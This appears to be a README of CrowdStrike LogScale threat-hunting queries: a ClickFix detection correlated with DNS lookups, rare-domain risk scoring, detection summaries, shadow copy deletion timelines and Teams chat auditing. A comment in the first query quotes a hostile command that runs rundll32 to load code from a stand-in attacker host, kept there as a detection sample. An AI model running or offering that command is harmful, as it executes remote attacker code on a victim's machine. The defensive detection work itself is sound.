<img width="1491" height="703" alt="Screenshot 2026-08-06 113446" src="https://github.com/user-attachments/assets/5624a769-043e-44b2-924d-d12c22179002" />

# click fix 

```
// detection logic in the defineTable, the event details we want are in the query root
defineTable(
  name="detections",
  query={
    #event_simpleName = ProcessRollup2
    | (
        CommandLine = /rundll32.exe \\\\/i // DETECTION "C:\Windows\system32\cmd.exe" /c "" start rundll32.exe \\evil.com,#1 ZG82Qx44
        OR (ComputerName = WVA2013893 AND CommandLine = /help/i) // detection test, looking for hostname executed on the commandline. The "suspicious" domain is ransomeware.live 
      )
    | detectionTime := @timestamp
    | trigger := CommandLine
    | select([detectionTime, trigger, aid, ComputerName])
  }, include=[aid, ComputerName, detectionTime, trigger]
)

// get all the dns hits
| #event_simpleName = /dns/i
// matched against the aid of a detection
| match(table=detections, field=[aid])
// delta milliseconds between the detectionTime of the trigger and our dns lookups
| delta := detectionTime - @timestamp
// delta must be greater than zer but less than 600000 milliseconds (10 mins)
| test(delta >= 0) | test(delta <= 600000)
| formatTime(format="%Y/%m/%d %H:%M:%S", as="detectionTime", field=detectionTime, timezone="Australia/Brisbane")
| formatTime(format="%Y/%m/%d %H:%M:%S", as="@timestamp", field=@timestamp, timezone="Australia/Brisbane")
//| format("%s - %s",field=[@timestamp,DomainName],as=DomainName)
| groupBy(field=[detectionTime, trigger, aid, ComputerName], function=[collect([DomainName])])
//| rename(field="DomainName", as="PotentiallyCompromisedDomain")
```


# parse tab delimited input

```
// PARSE TAB DELIMITED INPUT
| createEvents(["R1C1	R1C2	R1C3	R1C4	R1C5"])
| parseCsv(columns=["Col1", "Col2", "Col3", "Col4", "Col5"], delimiter="\t", field=@rawstring)
| drop(@rawstring)
```


# risky dns lookups based on all internal dns traffic through falcon

```
defineTable(query={
  | #event_simpleName = /dns/i | DomainName=*
  | !in(field=DomainName, values=[
      "*in-addr.arpa", "*in-addr.arpa." 
    , "*ip6.arpa", "*ip6.arpa."
    , "/.int.Corp.sun/i"  //internal devices
    , "*.rt.yammer.com"
  ])
  | groupBy([DomainName], function=[count(as=dnsPopularity)], limit=max)
  }, 
  include=[DomainName, dnsPopularity], name="mydns", start=1d)
| aid=6da678b09ca344bcac2641b4713a8139 // (TargetProcessId=2684651987135 OR ContextProcessId=2684651987135 OR RpcClientProcessId=2684651987135)
| #event_simpleName = /dns/i | DomainName=*
| groupby(DomainName)
| match(table="mydns", field=DomainName)
| risk:= (_count/dnsPopularity)*100
| format("%,.2f", field=risk, as=risk)
| risk >= 90 // risk rate
| drop(_count, dnsPopularity)

```


# get values from array split key value field and concat the results of the value field

```
/*
  COPILOT PROMPT

update your knowledge of logscale queries starting with this page. https://library.humio.com/data-analysis/functions-objectarray-eval.html

Then answer the question below. 

I have a repo that contains an array like the below. I want to concat all the .url values, explain to me how I can do this in logscale

Vendor.MessageImages[7].ItemType
Vendor.MessageImages[7].Url

*/

| "Vendor.MessageLinks[5].Url" = *  // filter so that we have fields that have results - TESTING
| objectArray:eval(
    "Vendor.MessageLinks[]",       // array
    var=image,    // variable name 
    function={urls := image.Url}, // build an array of urls only using the image.Url
    asArray="urls[]"
)
| urlsLength := array:length("urls[]")  // get the length of the array
| comboplus := concatArray(urls, separator="\n")  // concat the urls[] into a comboplus field
| select(fields=[@timestamp, urlsLength, comboplus])  // select 
```


# dynamic time, detection summary

```
setTimeInterval(  start="1d@d+13h",  end="now@d+13h",  timezone="Australia/Sydney")
| defineTable(query={
    | #event_simpleName=Event_UserActivityAuditEvent
    //| "Attributes.update_status" = closed
    | case {
      Attributes.append_comment = "Alert resolved. Classified as high_confidence_false_positive." | finding := "false_positive, auto closed by Tines";
      finding:=format( format="%s ~~~ %s",    field=[Attributes.add_tag, Attributes.append_comment]) ;
    }
    | select(["Attributes.composite_id",finding]) 

}, include=["Attributes.composite_id", "Attributes.add_tag", finding], name="closedEvent")
| #repo=detections
| #event_simpleName=/Event_EppDetectionSummaryEvent/i
| match(closedEvent, column=Attributes.composite_id, field=CompositeId, strict=true)
| Product := "[Falcon Endpoint]"
| groupBy([Product, SeverityName, Tactic, Technique, finding], function=[count(as=DetectionCount), collect(Hostname, separator=",")])
| Summary := format( format="%s x %s (%s) [%s] %s %s",    field=[DetectionCount, Product, SeverityName, Tactic, Technique, finding]) 
| table([DetectionCount, Summary])
//| sum(DetectionCount)

```


# shadow copy analysis

```

// //#event_simpleName=/VolumeSnapshotDeleted/i
| ComputerName=WVA2012261


/* 
SIMPLE EXPLAINATION :) 
CrowdStrike uses different field names to refer to "the process involved" depending on the event type

Event Type Field that holds the process ID
ProcessRollup2 TargetProcessId
NetworkConnectIP4 ContextProcessId
FileWritten ContextProcessId
DnsRequest ContextProcessId

So when you want to join or match events across types, you need a single consistent field to join on. That's what falconPID is — a normalised alias.

TargetProcessId ──┐
├──► falconPID (one consistent field to rule them all)
ContextProcessId ──┘

You create it so your downstream join, match, or table steps don't need to care which event type they're dealing with — they just reference falconPID and it always works
aka magic
*/
| falconPID := ContextProcessId | falconPID := TargetProcessId
| default(field=detection, value="false")
//NOTE: selfJoinFilter runs BEFORE the outer query so this DomainName search is rooly quick
| selfJoinFilter(field=[aid, falconPID], where=[{#event_simpleName=/VolumeSnapshotDeleted/i }], prefilter=false)
// show the hit
| case { #event_simpleName=/VolumeSnapshotDeleted/i | detection := "HIT" ; * | detection := "-" }
| eval(ActivityTarget=coalesce([TargetFileName, DomainName, RemoteAddressIP4, FileName]))
// #HACK timestamps are to the millisecond but sometimes dont order nicely. EndOfProcess has a field to hardcode to b
| default(field=alwaysLast, value="a")
// TREEVIEW?
| default(field="tree", value=" ├──")
// MAKE IT PRETTY
| case {
#event_simpleName=/ProcessRollup2/i | verbose := format(format="CMD: %s IMG:%s", field=[CommandLine, Target]) | tree:=FileName ;
#event_simpleName=/dns/i | verbose := format(format="DNS: %s", field=[DomainName]) ; // ioc:lookup(field=[DomainName], type=domain, confidenceThreshold=Unverified) |
#event_simpleName=/network/i | asn(field=RemoteAddressIP4) | verbose := format(format="CONN: %s:%s (%s)", field=[RemoteAddressIP4, RemotePort, RemoteAddressIP4.org]) ;
#event_simpleName=/file/i | verbose := format(format="WRITE: %s", field=[TargetFileName]) ;
#event_simpleName=/UserLogon/i | verbose := format(format="LOGON: %s (Type %s) to %s", field=[UserName, AuthenticationPackage, LogonServer]) ;
#event_simpleName=/UserIdentity/i | verbose := format(format="USER: %s (%s)", field=[UserName, UserSid]) ;
#event_simpleName=/VolumeSnapshotCreated/i | verbose := format(format="VolumeSnapshotCreated TargetFileName: %s", field=[TargetFileName]) ;
#event_simpleName=/VolumeSnapshotDeleted/i | verbose := format(format="VolumeSnapshotDeleted VolumeSnapshotName: %s by process.executable: %s", field=[VolumeSnapshotName, process.executable]) ;
#event_simpleName=/EndOfProcess/i | verbose := format(format="EXIT: %s (Duration: %sms)", field=[ExitCode, ProcessDuration_decimal]) | tree:=" └──" | alwaysLast:="b";
* | verbose := format(format="Other: %s %s", field=[#event_simpleName, CommandLine])
}


// OUTPUT AS A TABLE WITH SOME SORTING AND SOME DROPPING
| table([tree, falconPID, @timestamp, ComputerName, UserName, #event_simpleName, detection, verbose], limit=max)




```

# teams conversations

```
| #repo = 3pi_microsoft_365
| #event.dataset = m365.microsoftteams
| drop(@rawstring)

// TEST CASE FOR TESTING
| Vendor.ChatThreadId =19:uni01_zsip3nsfgskzmbkhwvp5emc2qm5ki3pmpib7yfe422yl5uwrkgsa@thread.v2 // CHAT WITH ADAM EXTERNAL "Adam Stein -G-"
//| Vendor.ChatThreadId =19:uni01_uvfwg5yknw3fnwtdcyvgobqq74nsdp6pxmrtml3a3ck7cmjmyldq@thread.v2 // CHAT WITH NOT ME EXTERNAL "Not Me"

/*
Vendor.UserMRI may contain a value which we can use.
 
example : 8:live:.cid.8d9f7820da52699f
8: = MRI prefix indicating a user identity object in Teams/Skype infrastructure. 
live: = The account is associated with a personal Microsoft Account (MSA) rather than an Azure AD/Entra ID work or school account.
.cid.8d9f7820da52699f = The Microsoft Account's Consumer ID (CID), represented in hexadecimal format.
*/
// SPLIT MRI and get accountType
| Vendor.UserMRI=* 
| splitString(field="Vendor.UserMRI", by=":") | accountType:=_splitstring[1]
// JOIN MEMBER.UPNS
| objectArray:eval(array="Vendor.Members[]", asArray="MemberUPNs[]", var=m, function={MemberUPNs := m.UPN})
| concatArray(MemberUPNs, as="AllUPNs", separator=", ")

| table(fields=[@timestamp, Vendor.Operation, accountType, @id, Vendor.UserMRI, Vendor.ItemName, Vendor.DisplayName, Vendor.CommunicationType, Vendor.ChatName, Vendor.ChatThreadId, AllUPNs], limit=max)
| sort(field=[@timestamp, Vendor.Operation], order=asc, limit=max)



////////////////////////////
// working notes
//Vendor.CommunicationType=OneOnOne 
//Vendor.Operation="ChatCreated" // only on chat creation
/*
  "Vendor.Operation"
  "ChatCreated"
  "ChatRetrieved"
  "MemberAdded"
  "MemberRemoved"
  "MessageCreatedHasLink"
  "MessageDeleted"
  "MessageEditedHasLink"
  "MessageEditedHasViolation"
  "MessageReadReceiptReceived"
  "MessageSent"
  "MessageUpdated"
  "ReactedToMessage"
*/
//| ipLocation(field=Vendor.ClientIP, as=IP)
//| /not me/i



//| header:=format(format="DATA: %s ", field=[Vendor.DisplayName])
//| transpose(header=header)


```

# dns lookups by process

```
ComputerName=LRA36QW826033HH
// Get all process execution and DNS events on Windows
| (#event_simpleName=ProcessRollup2 OR #event_simpleName=DnsRequest) event_platform=Win
// Normalize file name value across both events
| fileName:=concat([FileName, ContextBaseFileName])
// Make sure responsible process is a web browser
// Normalize Falcon UPID
| falconPID:=TargetProcessId | falconPID:=ContextProcessId
// Use selfJoinFilter to make sure execution and DNS resolution occured under the same UPID value
| selfJoinFilter(field=[aid, falconPID], where=[{#event_simpleName=ProcessRollup2}, {#event_simpleName=DnsRequest}])
// Aggregate results
| groupBy([aid, falconPID], function=([collect([ComputerName, UserName, fileName, DomainName])]))

```
